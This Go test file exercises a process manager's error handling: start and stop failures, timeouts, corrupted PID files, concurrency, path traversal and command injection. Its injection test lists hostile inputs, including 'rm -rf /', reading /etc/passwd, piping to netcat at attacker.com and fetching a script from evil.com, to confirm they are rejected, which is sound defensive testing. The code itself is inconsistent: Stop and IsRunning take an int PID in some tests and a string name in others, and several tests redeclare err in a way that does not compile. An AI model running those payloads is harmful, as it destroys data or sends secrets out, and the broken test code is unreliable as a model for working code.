package process

import (
	"context"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"testing"
	"time"
)

// TestStart_ErrorPaths tests error handling in process start
func TestStart_ErrorPaths(t *testing.T) {
	tests := []struct {
		name        string
		processName string
		command     string
		args        []string
		env         []string
		expectError bool
		errorMsg    string
	}{
		{
			name:        "nonexistent command",
			processName: "test",
			command:     "nonexistent-command-12345",
			args:        []string{},
			env:         []string{},
			expectError: true,
			errorMsg:    "executable file not found",
		},
		{
			name:        "empty command",
			processName: "test",
			command:     "",
			args:        []string{},
			env:         []string{},
			expectError: true,
			errorMsg:    "command",
		},
		{
			name:        "empty process name",
			processName: "",
			command:     "echo",
			args:        []string{"test"},
			env:         []string{},
			expectError: true,
			errorMsg:    "name",
		},
		{
			name:        "command that exits immediately",
			processName: "exit-test",
			command:     "sh",
			args:        []string{"-c", "exit 1"},
			env:         []string{},
			expectError: false, // Start succeeds, but process exits
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir := t.TempDir()
			pidDir := filepath.Join(dir, "pids")
			logDir := filepath.Join(dir, "logs")

			mgr, err := NewManager(pidDir, logDir)
			if err != nil {
				t.Fatal(err)
			}
			pid, err := mgr.Start(tt.processName, tt.command, tt.args, tt.env)

			if tt.expectError {
				if err == nil {
					t.Error("Expected error but got nil")
					if pid > 0 {
						// Clean up
						mgr.Stop(pid)
					}
				} else if tt.errorMsg != "" && !contains(err.Error(), tt.errorMsg) {
					t.Errorf("Expected error to contain %q, got: %v", tt.errorMsg, err)
				}
			} else {
				if err != nil {
					t.Errorf("Unexpected error: %v", err)
				}
				if pid > 0 {
					// Clean up
					mgr.Stop(pid)
				}
			}
		})
	}
}

// TestStop_ErrorPaths tests error handling in process stop
func TestStop_ErrorPaths(t *testing.T) {
	dir := t.TempDir()
	pidDir := filepath.Join(dir, "pids")
	logDir := filepath.Join(dir, "logs")
	mgr, err := NewManager(pidDir, logDir)
	if err != nil {
		t.Fatal(err)
	}

	tests := []struct {
		name        string
		setupFunc   func() int
		expectError bool
		errorMsg    string
	}{
		{
			name: "nonexistent process",
			setupFunc: func() int {
				return 99999 // Non-existent PID
			},
			expectError: true,
			errorMsg:    "no such process",
		},
		{
			name: "already stopped process",
			setupFunc: func() int {
				name := "already-stopped"
				pid, err := mgr.Start(name, "sleep", []string{"1"}, nil)
				if err != nil {
					t.Fatal(err)
				}
				if pid > 0 {
					// Kill it directly
					syscall.Kill(pid, syscall.SIGKILL)
					time.Sleep(100 * time.Millisecond)
				}
				return pid
			},
			expectError: true,
			errorMsg:    "no such process",
		},
		{
			name: "invalid PID (zero)",
			setupFunc: func() int {
				return 0
			},
			expectError: true,
			errorMsg:    "",
		},
		{
			name: "invalid PID (negative)",
			setupFunc: func() int {
				return -1
			},
			expectError: true,
			errorMsg:    "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			pid := tt.setupFunc()
			err := mgr.Stop(pid)

			if tt.expectError {
				if err == nil {
					t.Error("Expected error but got nil")
				} else if tt.errorMsg != "" && !contains(err.Error(), tt.errorMsg) {
					t.Errorf("Expected error to contain %q, got: %v", tt.errorMsg, err)
				}
			} else {
				if err != nil {
					t.Errorf("Unexpected error: %v", err)
				}
			}
		})
	}
}

// TestIsRunning_ErrorPaths tests error handling in status checks
func TestIsRunning_ErrorPaths(t *testing.T) {
	dir := t.TempDir()
	pidDir := filepath.Join(dir, "pids")
	logDir := filepath.Join(dir, "logs")
	mgr, err := NewManager(pidDir, logDir)
	if err != nil {
		t.Fatal(err)
	}

	tests := []struct {
		name          string
		setupFunc     func() int
		expectedState bool
	}{
		{
			name: "nonexistent process",
			setupFunc: func() int {
				return 99999 // Non-existent PID
			},
			expectedState: false,
		},
		{
			name: "invalid PID (zero)",
			setupFunc: func() int {
				return 0
			},
			expectedState: false,
		},
		{
			name: "process that exited",
			setupFunc: func() int {
				name := "exited-process"
				pid, err := mgr.Start(name, "sh", []string{"-c", "exit 0"}, nil)
				if err != nil {
					t.Fatal(err)
				}
				time.Sleep(100 * time.Millisecond)
				return pid
			},
			expectedState: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			pid := tt.setupFunc()
			running := mgr.IsRunning(pid)

			if running != tt.expectedState {
				t.Errorf("Expected IsRunning=%v, got %v", tt.expectedState, running)
			}
		})
	}
}

// TestStopAll_ErrorPaths tests error handling when stopping all processes
func TestStopAll_ErrorPaths(t *testing.T) {
	dir := t.TempDir()
	pidDir := filepath.Join(dir, "pids")
	logDir := filepath.Join(dir, "logs")
	mgr, err := NewManager(pidDir, logDir)
	if err != nil {
		t.Fatal(err)
	}

	// Start multiple processes, some will fail to stop
	pid1, err := mgr.Start("proc1", "sleep", []string{"10"}, nil)
	if err != nil {
		t.Fatal(err)
	}

	pid2, err := mgr.Start("proc2", "sleep", []string{"10"}, nil)
	if err != nil {
		t.Fatal(err)
	}

	// Kill one process directly to simulate a failure
	if pid1 > 0 {
		syscall.Kill(pid1, syscall.SIGKILL)
		time.Sleep(100 * time.Millisecond)
	}

	// StopAll should handle the already-dead process gracefully
	err = mgr.StopAll()
	
	// StopAll may return an error if some processes were already dead
	if err != nil {
		t.Logf("StopAll returned error (expected for already-dead process): %v", err)
	}

	// Verify all processes are stopped
	if mgr.IsRunning(pid1) {
		t.Error("proc1 should not be running")
	}
	if mgr.IsRunning(pid2) {
		t.Error("proc2 should not be running")
	}
}

// TestTimeout_ErrorPaths tests timeout handling
func TestTimeout_ErrorPaths(t *testing.T) {
	dir := t.TempDir()
	pidDir := filepath.Join(dir, "pids")
	logDir := filepath.Join(dir, "logs")
	mgr, err := NewManager(pidDir, logDir)
	if err != nil {
		t.Fatal(err)
	}

	// Start a process that ignores SIGTERM
	name := "stubborn-process"
	_, err := mgr.Start(name, "sh", []string{"-c", "trap '' TERM; sleep 100"}, nil)
	if err != nil {
		t.Fatal(err)
	}

	// Try to stop it - should timeout and force kill
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()

	done := make(chan error, 1)
	go func() {
		done <- mgr.Stop(name)
	}()

	select {
	case err := <-done:
		if err != nil {
			// Error is expected if force kill was needed
			t.Logf("Stop returned error (expected): %v", err)
		}
		// Verify process is actually stopped
		if mgr.IsRunning(name) {
			t.Error("Process should be stopped after timeout")
		}
	case <-ctx.Done():
		t.Error("Stop operation timed out")
	}
}

// TestPIDFile_ErrorPaths tests PID file error handling
func TestPIDFile_ErrorPaths(t *testing.T) {
	tests := []struct {
		name        string
		setupFunc   func(t *testing.T) (string, string)
		expectError bool
	}{
		{
			name: "unreadable PID directory",
			setupFunc: func(t *testing.T) (string, string) {
				dir := t.TempDir()
				pidDir := filepath.Join(dir, "pids")
				if err := os.MkdirAll(pidDir, 0000); err != nil {
					t.Fatal(err)
				}
				return pidDir, filepath.Join(dir, "logs")
			},
			expectError: true,
		},
		{
			name: "corrupted PID file",
			setupFunc: func(t *testing.T) (string, string) {
				dir := t.TempDir()
				pidDir := filepath.Join(dir, "pids")
				logDir := filepath.Join(dir, "logs")
				if err := os.MkdirAll(pidDir, 0755); err != nil {
					t.Fatal(err)
				}
				// Create corrupted PID file
				pidFile := filepath.Join(pidDir, "test.json")
				if err := os.WriteFile(pidFile, []byte("invalid json{"), 0644); err != nil {
					t.Fatal(err)
				}
				return pidDir, logDir
			},
			expectError: false, // Should handle gracefully
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			pidDir, logDir := tt.setupFunc(t)
			mgr, err := NewManager(pidDir, logDir)
			if err != nil && !tt.expectError {
				t.Fatal(err)
			}

			if mgr != nil {
				// Try to start a process
				_, err = mgr.Start("test", "echo", []string{"test"}, nil)

				if tt.expectError {
					if err == nil {
						t.Error("Expected error but got nil")
					}
				} else {
					// Should handle gracefully even with corrupted files
					if err != nil {
						t.Logf("Got error (may be expected): %v", err)
					}
				}
			}
		})
	}
}

// TestPanicRecovery tests that panics are handled gracefully
func TestPanicRecovery(t *testing.T) {
	defer func() {
		if r := recover(); r != nil {
			t.Errorf("Panic was not recovered: %v", r)
		}
	}()

	dir := t.TempDir()
	pidDir := filepath.Join(dir, "pids")
	logDir := filepath.Join(dir, "logs")
	mgr, err := NewManager(pidDir, logDir)
	if err != nil {
		t.Fatal(err)
	}

	// Try operations that might panic
	mgr.IsRunning("")
	mgr.Stop("")
	mgr.GetStatus("")
}

// TestConcurrentOperations tests error handling under concurrent access
func TestConcurrentOperations(t *testing.T) {
	dir := t.TempDir()
	pidDir := filepath.Join(dir, "pids")
	logDir := filepath.Join(dir, "logs")
	mgr, err := NewManager(pidDir, logDir)
	if err != nil {
		t.Fatal(err)
	}

	// Start a process
	name := "concurrent-test"
	_, err := mgr.Start(name, "sleep", []string{"5"}, nil)
	if err != nil {
		t.Fatal(err)
	}

	// Try to stop it multiple times concurrently
	done := make(chan error, 3)
	for i := 0; i < 3; i++ {
		go func() {
			done <- mgr.Stop(name)
		}()
	}

	// Collect results
	var errs []error
	for i := 0; i < 3; i++ {
		if err := <-done; err != nil {
			errs = append(errs, err)
		}
	}

	// At least one should succeed, others may error
	if len(errs) == 3 {
		t.Error("All concurrent stops failed")
	}

	// Process should be stopped
	if mgr.IsRunning(name) {
		t.Error("Process should be stopped")
	}
}

// TestInvalidInput tests handling of invalid input
func TestInvalidInput(t *testing.T) {
	dir := t.TempDir()
	pidDir := filepath.Join(dir, "pids")
	logDir := filepath.Join(dir, "logs")
	mgr, err := NewManager(pidDir, logDir)
	if err != nil {
		t.Fatal(err)
	}

	tests := []struct {
		name string
		fn   func() error
	}{
		{
			name: "start with nil args",
			fn: func() error {
				_, err := mgr.Start("test", "echo", nil, nil)
				return err
			},
		},
		{
			name: "start with nil env",
			fn: func() error {
				_, err := mgr.Start("test", "echo", []string{"test"}, nil)
				return err
			},
		},
		{
			name: "stop with special characters",
			fn: func() error {
				return mgr.Stop("test/../../../etc/passwd")
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.fn()
			// Should not panic, may return error
			if err != nil {
				t.Logf("Got error (expected): %v", err)
			}
		})
	}
}

// TestCommandInjection tests protection against command injection
func TestCommandInjection(t *testing.T) {
	dir := t.TempDir()
	pidDir := filepath.Join(dir, "pids")
	logDir := filepath.Join(dir, "logs")
	mgr, err := NewManager(pidDir, logDir)
	if err != nil {
		t.Fatal(err)
	}

	maliciousInputs := []string{
		"echo test; rm -rf /",
		"echo test && cat /etc/passwd",
		"echo test | nc attacker.com 1234",
		"$(curl evil.com/script.sh)",
		"`whoami`",
	}

	for _, input := range maliciousInputs {
		t.Run("injection: "+input, func(t *testing.T) {
			// These should be treated as literal command names, not executed
			_, err := mgr.Start("test", input, []string{}, nil)
			if err == nil {
				t.Error("Expected error for malicious input")
				mgr.Stop("test")
			}
			// Verify no actual command execution occurred
			if _, err := exec.LookPath(input); err == nil {
				t.Errorf("Malicious command should not exist: %s", input)
			}
		})
	}
}

// Helper function
func contains(s, substr string) bool {
	if len(substr) == 0 {
		return true
	}
	if len(s) < len(substr) {
		return false
	}
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}
